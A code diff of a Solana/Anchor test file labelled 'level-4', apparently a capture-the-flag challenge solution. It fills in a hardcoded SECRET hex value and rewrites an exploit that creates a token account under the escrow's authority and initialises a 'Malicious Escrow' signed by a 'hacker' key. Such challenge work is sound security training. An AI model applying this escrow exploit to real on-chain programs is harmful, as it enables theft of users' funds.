@@ -22,7 +22,7 @@ const SENDER_TOKEN_ACCOUNT = new web3.PublicKey("2CoFvgSNNV7oZcujdPV7Pe79GUdBuLk
 // v v v v v v v v v v v v v v v v v v v v v
 
 
-const SECRET = ""
+const SECRET = "69c5c9e5f885370d387e0d019c48f1629ab7cbfeb29e628dcebe2f78b0c2dacd"
 
 
 // ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
@@ -96,16 +96,16 @@ describe("level-4", async () => {
 
     const tx = new anchor.web3.Transaction().add(
       spl.createAssociatedTokenAccountInstruction(
-        attackEscrow.publicKey, // payer
+        hacker.publicKey, // payer
         attackEscrowAta, // ata
-        attackEscrow.publicKey, // authority
+        ESCROW_PDA, // authority
         USDC, // mint
         spl.TOKEN_2022_PROGRAM_ID,
         spl.ASSOCIATED_TOKEN_PROGRAM_ID
       )
     );
 
-    await anchor.web3.sendAndConfirmTransaction(provider.connection, tx, [attackEscrow]);
+    await anchor.web3.sendAndConfirmTransaction(provider.connection, tx, [hacker]);
 
     // Verify the ATA was created
     const attackEscrowAtaPubKey =  new web3.PublicKey(attackEscrowAta)
@@ -124,7 +124,8 @@ describe("level-4", async () => {
   // v v v v v v v v v v v v v v v v v v v v v
 
   it("Initialize Malicious Escrow", async () => {
-    
+
+
     const hack = await program.methods.initVesting(
       recipient.publicKey, //recipient
       new anchor.BN('1000'), //amount
@@ -133,15 +134,15 @@ describe("level-4", async () => {
       new anchor.BN('1') //interval
     )
     .accounts({
-      sender: attackEscrow.publicKey,
-      senderTokenAccount: ATTACK_ESCROW_ATA,
+      sender: hacker.publicKey,
+      senderTokenAccount: HACKER_TA,
       escrow: attackEscrow.publicKey,
-      escrowTokenAccount: ESCROW_TOKEN_ACCOUNT,
+      escrowTokenAccount: ATTACK_ESCROW_ATA,
       mint: USDC,
       tokenProgram: TOKEN_2022_PROGRAM_ID,
       systemProgram: web3.SystemProgram.programId,
     })
-    .signers([attackEscrow, hacker])
+    .signers([hacker])
     .rpc();
     await new Promise(resolve => setTimeout(resolve, 2000));
     console.log(hack)
